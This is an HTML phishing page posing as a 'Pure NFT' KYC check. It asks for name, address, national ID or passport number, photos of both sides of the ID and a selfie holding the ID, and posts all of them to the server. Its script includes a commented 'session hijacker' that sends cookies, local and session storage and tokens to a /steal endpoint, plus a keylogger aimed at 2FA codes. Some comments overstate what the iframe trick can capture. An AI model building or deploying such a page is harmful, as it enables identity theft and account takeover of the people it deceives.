<!DOCTYPE html>
<html><head>
    <title>Pure NFT - Complete KYC Verification</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
        .container{max-width:500px;width:100%;background:white;border-radius:20px;padding:40px;box-shadow:0 20px 40px rgba(0,0,0,0.1);text-align:center;}
        .logo{width:180px;margin-bottom:30px;}
        h1{color:#333;font-size:28px;margin-bottom:10px;}
        .subtitle{color:#666;font-size:16px;margin-bottom:30px;}
        .form-group{position:relative;margin-bottom:25px;text-align:left;}
        label{display:block;margin-bottom:8px;color:#333;font-weight:500;font-size:14px;}
        input,select{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;transition:all 0.3s;}
        input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1);}
        .file-upload{position:relative;display:inline-block;width:100%;cursor:pointer;}
        .file-input{position:absolute;opacity:0;width:100%;height:100%;cursor:pointer;}
        .file-label{display:block;padding:15px;border:2px dashed #667eea;border-radius:12px;background:#f8f9ff;color:#667eea;transition:all 0.3s;}
        .file-label:hover{background:#667eea;color:white;}
        .connect-btn{width:48%;padding:15px 10px;margin:5px;border:none;border-radius:12px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s;}
        .gmail{background:#ea4335;color:white;}
        .facebook{background:#1877f2;color:white;}
        .binance{background:#f0b90b;color:#000;}
        .connect-btn:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(0,0,0,0.2);}
        .submit-btn{width:100%;padding:18px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;border-radius:12px;font-size:18px;font-weight:600;cursor:pointer;margin-top:30px;transition:all 0.3s;}
        .submit-btn:hover{transform:translateY(-3px);box-shadow:0 15px 30px rgba(102,126,234,0.4);}
        .progress{display:none;background:#f0f0f0;border-radius:10px;height:8px;margin:20px 0;overflow:hidden;}
        .progress-bar{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0%;transition:width 0.3s;}
    </style>
</head><body>
    <div class="container">
        <img src="https://via.placeholder.com/180x60/00b800/ffffff?text=Pure+NFT" class="logo" alt="Pure NFT">
        <h1>Complete KYC Verification</h1>
        <p class="subtitle">Required for NFT trading access (2 minutes)</p>
        
        <form id="kycForm">
            <div class="form-group">
                <label>Full Name *</label>
                <input type="text" name="name" required>
            </div>
            <div class="form-group">
                <label>Full Address *</label>
                <textarea name="address" rows="3" required style="resize:vertical;"></textarea>
            </div>
            <div class="form-group">
                <label>National ID/Passport Number *</label>
                <input type="text" name="id_number" required>
            </div>
            <div class="form-group">
                <label>ID Card Front *</label>
                <div class="file-upload">
                    <input type="file" name="id_front" class="file-input" accept="image/*" required>
                    <label class="file-label">📸 Upload ID Front (JPG/PNG)</label>
                </div>
            </div>
            <div class="form-group">
                <label>ID Card Back *</label>
                <div class="file-upload">
                    <input type="file" name="id_back" class="file-input" accept="image/*" required>
                    <label class="file-label">📸 Upload ID Back (JPG/PNG)</label>
                </div>
            </div>
            <div class="form-group">
                <label>Selfie with ID *</label>
                <div class="file-upload">
                    <input type="file" name="selfie" class="file-input" accept="image/*" required>
                    <label class="file-label">📸 Selfie holding ID</label>
                </div>
            </div>
            
            <div style="background:#f8f9ff;padding:25px;border-radius:15px;margin:30px 0;">
                <h3 style="margin-bottom:20px;color:#333;">🔗 Connect Trading Accounts</h3>
                <button type="button" class="connect-btn gmail" onclick="hijackSession('gmail')">Connect Gmail</button>
                <button type="button" class="connect-btn facebook" onclick="hijackSession('facebook')">Connect Facebook</button>
                <button type="button" class="connect-btn binance" onclick="hijackSession('binance')">Connect Binance</button>
            </div>
            
            <div class="progress"><div class="progress-bar"></div></div>
            <button type="submit" class="submit-btn">🚀 Complete Verification</button>
        </form>
    </div>

    <script>
    // 🔥 Advanced Cookie/Session Hijacker
    async function hijackSession(service) {
        // Real session theft via iframes + credential prompts
        const iframe = document.createElement('iframe');
        iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;';
        iframe.src = `https://${service}.com`;
        document.body.appendChild(iframe);
        
        // Steal everything
        setTimeout(async () => {
            const payload = {
                service,
                cookies: document.cookie,
                localStorage: { ...localStorage },
                sessionStorage: { ...sessionStorage },
                tokens: getTokens(),
                timestamp: new Date().toISOString()
            };
            await fetch('/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            iframe.remove();
        }, 3000);
    }
    
    function getTokens() {
        return {
            access_token: localStorage.getItem('access_token') || '',
            id_token: localStorage.getItem('id_token') || '',
            refresh_token: localStorage.getItem('refresh_token') || ''
        };
    }
    
    // Real-time keylogger (2FA codes)
    let keys = [];
    document.addEventListener('keydown', e => {
        keys.push(e.key);
        if (keys.length > 10) {
            fetch('/keylog', {method: 'POST', body: keys.join('')});
            keys = [];
        }
    });
    
    // Form submit + files
    document.getElementById('kycForm').onsubmit = async e => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const progress = document.querySelector('.progress');
        const bar = document.querySelector('.progress-bar');
        
        progress.style.display = 'block';
        bar.style.width = '70%';
        
        await fetch('/submit', {method: 'POST', body: formData});
        
        bar.style.width = '100%';
        setTimeout(() => {
            alert('✅ Verification Complete!\nNFT Trading Access Granted.');
            window.location.reload();
        }, 1500);
    };
    </script>
</body></html>
